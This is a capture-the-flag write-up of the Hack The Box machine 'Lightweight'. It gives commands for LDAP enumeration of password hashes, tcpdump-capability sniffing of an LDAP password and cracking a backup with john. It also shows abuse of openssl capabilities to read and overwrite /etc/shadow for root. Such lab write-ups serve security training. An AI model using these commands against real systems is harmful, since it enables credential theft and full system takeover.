@@ -1,0 +1,308 @@
+I"�3<h1 id="introductionlightweight">Introduction@Lightweight:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Lightweight</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.119</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>30</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://www.hackthebox.eu/home/users/profile/13340">0xEA31</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>8th December 2018</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li>Exploring the <code class="language-plaintext highlighter-rouge">website</code> and loging into ssh with least priveleges.</li>
+  <li>Escalating privileges to another user i.e <code class="language-plaintext highlighter-rouge">ldapuser2</code> by exploiting <strong>POSIX</strong> capabilities for <em>tcpdump</em>.</li>
+  <li>Cracking a backup file to escalate privileges to another user i.e <code class="language-plaintext highlighter-rouge">ldapuser2</code></li>
+  <li>Escalating privileges to <code class="language-plaintext highlighter-rouge">root</code> by exploiting <strong>POSIX</strong> capabilities for <em>openssl</em>.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
+
+<p>Download link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/nmap-automator-1.png" alt="" /></p>
+
+<p>Let’s access <code class="language-plaintext highlighter-rouge">Port 80</code> first.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/port-80-2.png" alt="" /></p>
+
+<p>I used <code class="language-plaintext highlighter-rouge">dirbuster</code> to check for <em>hidden directories</em>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/dirbuster-start-3.png" alt="" /></p>
+
+<p>As we have seen port <em>389</em> i.e for <code class="language-plaintext highlighter-rouge">ldap port</code>. Let’s use <code class="language-plaintext highlighter-rouge">ldapsearch</code> to enumerate the port.</p>
+
+<p><strong>Command</strong>: <em>ldapsearch -x -h 10.10.10.119 -D ‘’ -w ‘’ -b “dc=lightweight,dc=htb”</em></p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/ldapsearch-command-5.png" alt="" /></p>
+
+<p>I found <code class="language-plaintext highlighter-rouge">2 Users</code> and their hashes.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/ldapsearch-users-password-6.png" alt="" /></p>
+
+<p><strong>Details</strong>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Username</code>: ldapuser1</p>
+
+<p><code class="language-plaintext highlighter-rouge">Password</code>:e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2Roai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv</p>
+
+<p><code class="language-plaintext highlighter-rouge">Hash Password</code>: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/</p>
+
+<p><code class="language-plaintext highlighter-rouge">Username</code>: ldapuser2</p>
+
+<p><code class="language-plaintext highlighter-rouge">Password</code>:e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x</p>
+
+<p><code class="language-plaintext highlighter-rouge">Hash Password</code>: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1</p>
+
+<p>I tried using <code class="language-plaintext highlighter-rouge">John</code> to crack the hashes but it didn’t work out.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/john-processing-7.png" alt="" /></p>
+
+<p><strong>Command</strong>: <em>john –wordlist=/usr/share/wordlists/rockyou.txt hashes</em></p>
+
+<p>After that I checked port 80 thoroughly and found <code class="language-plaintext highlighter-rouge">http://10.10.10.119/info.php</code> and <code class="language-plaintext highlighter-rouge">http://10.10.10.119/user.php</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/port-80-info-php-8.png" alt="" /></p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/checking-user-php-9.png" alt="" /></p>
+
+<p>Let’s login into <code class="language-plaintext highlighter-rouge">ssh</code> with the given credentials.</p>
+
+<p><strong>Command</strong>: <em>ssh 10.10.14.14@10.10.10.119</em> <strong>and</strong> <em>password: 10.10.14.14</em></p>
+
+<p>We don’t have permissions to access <code class="language-plaintext highlighter-rouge">ldapuser1</code> and <code class="language-plaintext highlighter-rouge">ldapuser2</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/permission-denied-ldapuser-11.png" alt="" /></p>
+
+<p>Let’s use <code class="language-plaintext highlighter-rouge">LinEnum.sh</code> to escalate privileges.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/sending-linpeas=-sh-12.png" alt="" /></p>
+
+<p><strong>Command</strong>: <em>wget http://10.10.14.14:8081/linpeas.sh</em></p>
+
+<p><strong>Command</strong>: <em>python3 -m http.server 8081</em></p>
+
+<p>Ran LinEnum.sh after giving executing permissions using <em>chmod +x linpeas.sh</em> and found this</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/posix-capabilities-13.png" alt="" /></p>
+
+<p>Read about <a href="https://linux-audit.com/linux-capabilities-101/">Linux Capabilities</a>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">/usr/sbin/tcpdump</code> = <em>cap_net_admin,cap_net_raw+ep</em></p>
+
+<p><strong>cap_net_admin</strong>:</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/cap-net-admin-14.png" alt="" /></p>
+
+<p><strong>cap_net_raw+ep</strong>:</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/cap-net-raw-15.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">+ep</code> at the end stands for adding the capability as Effective and Permitted.</p>
+
+<p><code class="language-plaintext highlighter-rouge">e</code>: Effective –&gt; This means the capability is “activated”.</p>
+
+<p><code class="language-plaintext highlighter-rouge">p</code>: Permitted –&gt; This means the capability can be used/is allowed.</p>
+
+<p>This means we can run TCP dump on any of the port using this capability, let’s try to get the password of LDAP user using it.</p>
+
+<p><strong>Command to run on local machine</strong>: <em>ssh 10.10.14.14@10.10.10.119 /usr/sbin/tcpdump -i any -U -w - ‘not port 22’ &gt; tcpdump.cap</em></p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/tcp-dump-command-16.png" alt="" /></p>
+
+<p>Now Go to <code class="language-plaintext highlighter-rouge">10.10.10.119</code> and visit <code class="language-plaintext highlighter-rouge">user;info;status</code> pages, this is because our account is being created and we will view the intercepted traffic using wireshark.</p>
+
+<p>Opening <strong>tcpdump.cap</strong> file on wireshark and let’s check <code class="language-plaintext highlighter-rouge">LDAP</code> Protocol.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/got-ldapuser2-password-17.png" alt="" /></p>
+
+<p>Got <code class="language-plaintext highlighter-rouge">Password</code> for <em>ldapuser2</em> as <code class="language-plaintext highlighter-rouge">8bc8251332abe1d7f105d3e53ad39ac2</code>.</p>
+
+<p>Logging in as <code class="language-plaintext highlighter-rouge">ldapuser2</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/su-ldapuser2-18.png" alt="" /></p>
+
+<p>Got <code class="language-plaintext highlighter-rouge">User</code> Flag.</p>
+
+<p>In <code class="language-plaintext highlighter-rouge">ldapuser2</code>, I found a backup file called <em>backup.7z</em>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/backup-7a-19.png" alt="" /></p>
+
+<p>Let’s download it to our local machine using <code class="language-plaintext highlighter-rouge">scp</code>.</p>
+
+<p><strong>Command</strong>: <em>scp 10.10.14.14@10.10.10.119:/home/ldapuser2/backup.7z /home/pulkittalwar2611/Pictures/lightweight-htb/backup.7z</em></p>
+
+<p>It shows <code class="language-plaintext highlighter-rouge">permission denied</code> now let’s <code class="language-plaintext highlighter-rouge">base64</code> encode it and then transfer it.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Command</strong>: *cat backup.7z</td>
+      <td>base64*</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/base64-encode-20.png" alt="" /></p>
+
+<p>Creating a file called <code class="language-plaintext highlighter-rouge">backup.7z.base64</code> and saving it there.</p>
+
+<p>Now decoding it on our local machine –&gt; <em>cat backup.7z.base64 PIPE base64 –decode &gt; backup.7z</em></p>
+
+<p>Now let’s use <code class="language-plaintext highlighter-rouge">7z2john.pl</code> to convert it and then crack the password of the file using <code class="language-plaintext highlighter-rouge">john</code>.</p>
+
+<p><strong>Command</strong>: <em>/usr/share/john/7z2john.pl backup.7z &gt; backup_file</em></p>
+
+<p>Installing dependencies: <em>apt install libcompress-raw-lzma-perl</em></p>
+
+<p><strong>John Command</strong>: <em>john –wordlist=/usr/share/wordlists/rockyou.txt backup_file</em></p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/7z2john-21.png" alt="" /></p>
+
+<p>Got password as <code class="language-plaintext highlighter-rouge">delete</code>, After accessing it and we found <strong>4 Files</strong>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/we-got-4-files-22.png" alt="" /></p>
+
+<p>Accessing these files we got <strong>password</strong> for <code class="language-plaintext highlighter-rouge">ldapuser1</code> as <code class="language-plaintext highlighter-rouge">f3ca9d298a553da117442deeb6fa932d</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/ldapuser1-passord-23.png" alt="" /></p>
+
+<p>Switching to <code class="language-plaintext highlighter-rouge">ldapuser1</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/su-ldapuser1-24.png" alt="" /></p>
+
+<p>Files in <code class="language-plaintext highlighter-rouge">ldapuser1</code> directory.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/files-in-ldapuser1-25.png" alt="" /></p>
+
+<p>Now let’s use <code class="language-plaintext highlighter-rouge">LinEnum.sh</code> again to escalate privileges.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/downloading-linenum-ldapuser1-26.png" alt="" /></p>
+
+<p><strong>Command</strong>: <em>wget http://10.10.14.14:8081/LinEnum.sh</em></p>
+
+<p><strong>Command</strong>: <em>python3 -m http.server 8081</em></p>
+
+<p>Ran LinEnum.sh after giving executing permissions using <em>chmod +x LinEnum.sh</em> and found this</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/posix-capabilities-27.png" alt="" /></p>
+
+<p>We have <code class="language-plaintext highlighter-rouge">ep permissions</code> on <code class="language-plaintext highlighter-rouge">openssl</code> i.e <strong>effective and permitted</strong>.</p>
+
+<p>Read this regarding <a href="https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099">Escalating Privileges using openssl</a></p>
+
+<p>Reading the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> : <strong>/home/ldapuser1/openssl enc -in “/etc/shadow”</strong></p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/read-etc-shadow-28.png" alt="" /></p>
+
+<p>Generating a <code class="language-plaintext highlighter-rouge">hash</code> with the password as <strong>password</strong>. (<em>-1: uses the MD5 based BSD password algorithm 1</em>)</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/creating-password-29.png" alt="" /></p>
+
+<p>Creating a new shadow file and copy all the data of <code class="language-plaintext highlighter-rouge">/etc/shadow</code> to it and replace the root hash by the new hash created i.e. <code class="language-plaintext highlighter-rouge">$1$1Mo8wQD9$k2OI6vD05Drc6xPwfayLA.</code></p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/shadow-created-30.png" alt="" /></p>
+
+<p>Replacing new shadow file in <code class="language-plaintext highlighter-rouge">/etc/shadow</code> using <em>openssl commands</em> –&gt; <strong>/home/ldapuser1/openssl enc -in shadow -out /etc/shadow</strong></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">su root</code> and enter password i.e <code class="language-plaintext highlighter-rouge">password</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/lightweight-hackthebox/root-31.png" alt="" /></p>
+
+<p>Got Root.</p>
+:ET
